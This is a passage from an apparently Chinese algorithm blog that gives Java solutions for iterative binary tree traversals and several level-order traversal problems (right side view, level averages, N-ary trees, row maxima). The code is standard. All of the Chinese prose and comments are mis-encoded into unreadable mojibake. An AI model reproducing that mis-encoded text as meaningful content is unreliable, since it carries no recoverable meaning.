åªæœ‰é‡åˆ°ç©ºèŠ‚ç‚¹çš„æ—¶å€™ï¼Œæ‰å°†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ”¾è¿›ç»“æœé›†</span></span><br><span class="line">                st.pop();           <span class="comment">// å°†ç©ºèŠ‚ç‚¹å¼¹å‡º</span></span><br><span class="line">                node = st.peek();    <span class="comment">// é‡æ–°å–å‡ºæ ˆä¸­å…ƒç´ </span></span><br><span class="line">                st.pop();</span><br><span class="line">                result.add(node.val); <span class="comment">// åŠ å…¥åˆ°ç»“æœé›†</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿­ä»£æ³•ä¸­åºéå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">    <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            st.pop(); <span class="comment">// å°†è¯¥èŠ‚ç‚¹å¼¹å‡ºï¼Œé¿å…é‡å¤æ“ä½œï¼Œä¸‹é¢å†å°†å³ä¸­å·¦èŠ‚ç‚¹æ·»åŠ åˆ°æ ˆä¸­</span></span><br><span class="line">            <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// æ·»åŠ å³èŠ‚ç‚¹ï¼ˆç©ºèŠ‚ç‚¹ä¸å…¥æ ˆï¼‰</span></span><br><span class="line">            st.push(node);                          <span class="comment">// æ·»åŠ ä¸­èŠ‚ç‚¹</span></span><br><span class="line">            st.push(<span class="literal">null</span>); <span class="comment">// ä¸­èŠ‚ç‚¹è®¿é—®è¿‡ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰å¤„ç†ï¼ŒåŠ å…¥ç©ºèŠ‚ç‚¹åšä¸ºæ ‡è®°ã€‚</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// æ·»åŠ å·¦èŠ‚ç‚¹ï¼ˆç©ºèŠ‚ç‚¹ä¸å…¥æ ˆï¼‰</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// åªæœ‰é‡åˆ°ç©ºèŠ‚ç‚¹çš„æ—¶å€™ï¼Œæ‰å°†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ”¾è¿›ç»“æœé›†</span></span><br><span class="line">            st.pop();           <span class="comment">// å°†ç©ºèŠ‚ç‚¹å¼¹å‡º</span></span><br><span class="line">            node = st.peek();    <span class="comment">// é‡æ–°å–å‡ºæ ˆä¸­å…ƒç´ </span></span><br><span class="line">            st.pop();</span><br><span class="line">            result.add(node.val); <span class="comment">// åŠ å…¥åˆ°ç»“æœé›†</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿­ä»£æ³•ååºéå†ä»£ç </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                st.pop(); <span class="comment">// å°†è¯¥èŠ‚ç‚¹å¼¹å‡ºï¼Œé¿å…é‡å¤æ“ä½œï¼Œä¸‹é¢å†å°†å³ä¸­å·¦èŠ‚ç‚¹æ·»åŠ åˆ°æ ˆä¸­</span></span><br><span class="line">                st.push(node);                          <span class="comment">// æ·»åŠ ä¸­èŠ‚ç‚¹</span></span><br><span class="line">                st.push(<span class="literal">null</span>); <span class="comment">// ä¸­èŠ‚ç‚¹è®¿é—®è¿‡ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰å¤„ç†ï¼ŒåŠ å…¥ç©ºèŠ‚ç‚¹åšä¸ºæ ‡è®°ã€‚</span></span><br><span class="line">                <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// æ·»åŠ å³èŠ‚ç‚¹ï¼ˆç©ºèŠ‚ç‚¹ä¸å…¥æ ˆï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// æ·»åŠ å·¦èŠ‚ç‚¹ï¼ˆç©ºèŠ‚ç‚¹ä¸å…¥æ ˆï¼‰         </span></span><br><span class="line">                               </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// åªæœ‰é‡åˆ°ç©ºèŠ‚ç‚¹çš„æ—¶å€™ï¼Œæ‰å°†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ”¾è¿›ç»“æœé›†</span></span><br><span class="line">                st.pop();           <span class="comment">// å°†ç©ºèŠ‚ç‚¹å¼¹å‡º</span></span><br><span class="line">                node = st.peek();    <span class="comment">// é‡æ–°å–å‡ºæ ˆä¸­å…ƒç´ </span></span><br><span class="line">                st.pop();</span><br><span class="line">                result.add(node.val); <span class="comment">// åŠ å…¥åˆ°ç»“æœé›†</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘çš„ç»“æ„"><a href="#äºŒå‰æ ‘çš„ç»“æ„" class="headerlink" title="äºŒå‰æ ‘çš„ç»“æ„"></a>äºŒå‰æ ‘çš„ç»“æ„</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line"></span><br><span class="line">    TreeNode() &#123;&#125;</span><br><span class="line">    TreeNode(<span class="type">int</span> val) &#123; <span class="built_in">this</span>.val = val; &#125;</span><br><span class="line">    TreeNode(<span class="type">int</span> val, TreeNode left, TreeNode right) &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">        <span class="built_in">this</span>.left = left;</span><br><span class="line">        <span class="built_in">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æ ‘çš„å±‚åºéå†"><a href="#äºŒå‰æ ‘çš„å±‚åºéå†" class="headerlink" title="äºŒå‰æ ‘çš„å±‚åºéå†"></a>äºŒå‰æ ‘çš„å±‚åºéå†</h2><h3 id="102-äºŒå‰æ ‘çš„å±‚åºéå†"><a href="#102-äºŒå‰æ ‘çš„å±‚åºéå†" class="headerlink" title="102.äºŒå‰æ ‘çš„å±‚åºéå†"></a>102.äºŒå‰æ ‘çš„å±‚åºéå†</h3><p>ç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼Œè¿”å›å…¶èŠ‚ç‚¹å€¼çš„ å±‚åºéå† ã€‚ ï¼ˆå³é€å±‚åœ°ï¼Œä»å·¦åˆ°å³è®¿é—®æ‰€æœ‰èŠ‚ç‚¹ï¼‰ã€‚</p><p>å±‚åºéå†ä¸€ä¸ªäºŒå‰æ ‘ã€‚å°±æ˜¯ä»å·¦åˆ°å³ä¸€å±‚ä¸€å±‚çš„å»éå†äºŒå‰æ ‘ã€‚è¿™ç§éå†çš„æ–¹å¼å’Œæˆ‘ä»¬ä¹‹å‰è®²è¿‡çš„éƒ½ä¸å¤ªä¸€æ ·ã€‚éœ€è¦å€Ÿç”¨ä¸€ä¸ªè¾…åŠ©æ•°æ®ç»“æ„å³é˜Ÿåˆ—æ¥å®ç°ï¼Œé˜Ÿåˆ—å…ˆè¿›å…ˆå‡ºï¼Œç¬¦åˆä¸€å±‚ä¸€å±‚éå†çš„é€»è¾‘ï¼Œè€Œç”¨æ ˆå…ˆè¿›åå‡ºé€‚åˆæ¨¡æ‹Ÿæ·±åº¦ä¼˜å…ˆéå†ä¹Ÿå°±æ˜¯é€’å½’çš„é€»è¾‘ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="comment">// checkFun01(root, 0)</span></span><br><span class="line">        checkFun02(root);</span><br><span class="line">        <span class="keyword">return</span> resList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BFS é€’å½’æ–¹å¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun01</span><span class="params">(TreeNode node, Integer deep)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        deep++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(resList.size() &lt; deep)&#123;</span><br><span class="line">            <span class="comment">// å½“å±‚çº§å¢åŠ æ—¶ï¼ŒListçš„Itemä¹Ÿå¢åŠ ï¼Œåˆ©ç”¨listçš„ç´¢å¼•å€¼è¿›è¡Œå±‚çº§ç•Œå®š</span></span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            resList.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        resList.get(deep - <span class="number">1</span>).add(node.val);</span><br><span class="line">        checkFun01(node.left, deep);</span><br><span class="line">        checkFun01(node.right, deep);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿­ä»£æ–¹å¼ - å€ŸåŠ©é˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun02</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        que.offer(node);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            List&lt;Integer&gt; itemList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> que.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">tmpNode</span> <span class="operator">=</span> que.poll();</span><br><span class="line">                itemList.add(tmpNode.val);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(tmpNode.left != <span class="literal">null</span>) que.offer(tmpNode.left);</span><br><span class="line">                <span class="keyword">if</span>(tmpNode.right != <span class="literal">null</span>) que.offer(tmpNode.right);</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            resList.add(itemList);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="107-äºŒå‰æ ‘çš„å±‚æ¬¡éå†-II"><a href="#107-äºŒå‰æ ‘çš„å±‚æ¬¡éå†-II" class="headerlink" title="107.äºŒå‰æ ‘çš„å±‚æ¬¡éå† II"></a>107.äºŒå‰æ ‘çš„å±‚æ¬¡éå† II</h3><p>ç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼Œè¿”å›å…¶èŠ‚ç‚¹å€¼ è‡ªåº•å‘ä¸Šçš„å±‚åºéå† ã€‚ ï¼ˆå³æŒ‰ä»å¶å­èŠ‚ç‚¹æ‰€åœ¨å±‚åˆ°æ ¹èŠ‚ç‚¹æ‰€åœ¨çš„å±‚ï¼Œé€å±‚ä»å·¦å‘å³éå†ï¼‰</p><p>ç›¸å¯¹äº102.äºŒå‰æ ‘çš„å±‚åºéå†ï¼Œå°±æ˜¯æœ€åæŠŠresultæ•°ç»„åè½¬ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><h3 id="199-äºŒå‰æ ‘çš„å³è§†å›¾"><a href="#199-äºŒå‰æ ‘çš„å³è§†å›¾" class="headerlink" title="199.äºŒå‰æ ‘çš„å³è§†å›¾"></a>199.äºŒå‰æ ‘çš„å³è§†å›¾</h3><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘çš„ æ ¹èŠ‚ç‚¹ rootï¼Œæƒ³è±¡è‡ªå·±ç«™åœ¨å®ƒçš„å³ä¾§ï¼ŒæŒ‰ç…§ä»é¡¶éƒ¨åˆ°åº•éƒ¨çš„é¡ºåºï¼Œè¿”å›ä»å³ä¾§æ‰€èƒ½çœ‹åˆ°çš„èŠ‚ç‚¹å€¼ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-8.png"><br>è¾“å…¥: [1,2,3,null,5,null,4]<br>è¾“å‡º: [1,3,4]</p><p>å±‚åºéå†çš„æ—¶å€™ï¼Œåˆ¤æ–­æ˜¯å¦éå†åˆ°å•å±‚çš„æœ€åé¢çš„å…ƒç´ ï¼Œå¦‚æœæ˜¯ï¼Œå°±æ”¾è¿›resultæ•°ç»„ä¸­ï¼Œéšåè¿”å›resultå°±å¯ä»¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        que.offerLast(root);</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">levelSize</span> <span class="operator">=</span> que.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> que.pollFirst();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i == levelSize - <span class="number">1</span>)&#123;</span><br><span class="line">                    list.add(poll.val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="637-äºŒå‰æ ‘çš„å±‚å¹³å‡å€¼"><a href="#637-äºŒå‰æ ‘çš„å±‚å¹³å‡å€¼" class="headerlink" title="637.äºŒå‰æ ‘çš„å±‚å¹³å‡å€¼"></a>637.äºŒå‰æ ‘çš„å±‚å¹³å‡å€¼</h3><p>ç»™å®šä¸€ä¸ªéç©ºäºŒå‰æ ‘, è¿”å›ä¸€ä¸ªç”±æ¯å±‚èŠ‚ç‚¹å¹³å‡å€¼ç»„æˆçš„æ•°ç»„ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-9.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Double&gt; <span class="title function_">averageOfLevels</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Double&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        que.offerLast(root);</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">levelSize</span> <span class="operator">=</span> que.size();</span><br><span class="line">            <span class="type">Double</span> <span class="variable">levelSum</span> <span class="operator">=</span> <span class="number">0.0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> que.pollFirst();</span><br><span class="line"></span><br><span class="line">                levelSum += poll.val;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(levelSum / levelSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="429-Nå‰æ ‘çš„å±‚åºéå†"><a href="#429-Nå‰æ ‘çš„å±‚åºéå†" class="headerlink" title="429.Nå‰æ ‘çš„å±‚åºéå†"></a>429.Nå‰æ ‘çš„å±‚åºéå†</h3><p>ç»™å®šä¸€ä¸ª N å‰æ ‘ï¼Œè¿”å›å…¶èŠ‚ç‚¹å€¼çš„å±‚åºéå†ã€‚ (å³ä»å·¦åˆ°å³ï¼Œé€å±‚éå†)ã€‚<br>ä¾‹å¦‚ï¼Œç»™å®šä¸€ä¸ª 3å‰æ ‘ :<br><img src="/2024/10/29/algorithm/binarytree/image-10.png"><br>è¿”å›å…¶å±‚åºéå†:<br>[ [1], [3,2,4], [5,6] ]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;Node&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        que.offerLast(root);</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">levelSize</span> <span class="operator">=</span> que.size();</span><br><span class="line">            List&lt;Integer&gt; levelList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">poll</span> <span class="operator">=</span> que.pollFirst();</span><br><span class="line"></span><br><span class="line">                levelList.add(poll.val);</span><br><span class="line"></span><br><span class="line">                List&lt;Node&gt; children = poll.children;</span><br><span class="line">                <span class="keyword">if</span>(children == <span class="literal">null</span> || children.size() == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(Node child : children)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (child != <span class="literal">null</span>)&#123;</span><br><span class="line">                        que.offerLast(child);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(levelList);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="515-åœ¨æ¯ä¸ªæ ‘è¡Œä¸­æ‰¾æœ€å¤§å€¼"><a href="#515-åœ¨æ¯ä¸ªæ ‘è¡Œä¸­æ‰¾æœ€å¤§å€¼" class="headerlink" title="515.åœ¨æ¯ä¸ªæ ‘è¡Œä¸­æ‰¾æœ€å¤§å€¼"></a>515.åœ¨æ¯ä¸ªæ ‘è¡Œä¸­æ‰¾æœ€å¤§å€¼</h3><p>ç»™å®šä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼Œè¯·æ‰¾å‡ºè¯¥äºŒå‰æ ‘ä¸­æ¯ä¸€å±‚çš„æœ€å¤§å€¼ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-11.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">largestValues</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> queue.size(); i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                max = Math.max(max, node.val);</span><br><span class="line">                <span 